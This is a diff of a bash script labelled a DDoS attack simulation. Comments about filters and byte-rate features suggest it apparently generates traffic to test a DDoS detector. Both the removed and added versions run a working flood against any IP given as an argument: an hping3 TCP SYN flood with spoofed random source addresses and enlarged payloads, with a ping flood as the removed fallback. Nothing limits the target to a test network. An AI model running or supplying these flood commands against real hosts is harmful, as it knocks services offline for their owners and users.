@@ -1,28 +1,20 @@
 #!/bin/bash
-# DDoS Attack Simulation - High-intensity Optimized version
+# DDoS Attack Simulation
 
 TARGET=$1
 DURATION=${2:-30}
-RATE=${3:-2000} 
 
 if [ -z "$TARGET" ]; then
-    echo "Usage: $0 <target_ip> [duration_seconds] [rate_pps]"
+    echo "Usage: $0 <target_ip> [duration_seconds]"
     exit 1
 fi
 
 echo "Starting High-Intensity DDoS on $TARGET for $DURATION seconds..."
 
-if command -v hping3 &> /dev/null; then
-    echo "Using hping3 for Randomized TCP SYN Flood..."
-    # --rand-source: Spoofs IPs to increase entropy
-    # -d 120: Adds payload data to increase byte_count
-    # -i u500: Sends a packet every 500 microseconds (extremely fast)
-    timeout $DURATION sudo hping3 -S -p 80 --flood --rand-source -d 120 -i u500 $TARGET > /dev/null 2>&1
-else
-    echo "Using Native Flood with increased payload..."
-    # -s 1450: Maximize packet size to trigger byte-rate features
-    # -f: Native kernel-level flood
-    timeout $DURATION sudo ping -f -l $RATE -s 1450 $TARGET > /dev/null 2>&1
-fi
+# We use -S (SYN), -p 80 (Target Port), and --flood for speed
+# --rand-source: Creates maximum entropy for your dynamic filter
+# -d 1000: Increases payload to 1000 bytes to spike byte-rate features
+# --win 65535: Maximize TCP window size to look like a real connection attempt
+timeout $DURATION sudo hping3 -S -p 80 --flood --rand-source -d 1000 --win 65535 $TARGET > /dev/null 2>&1
 
 echo "DDoS attack completed"
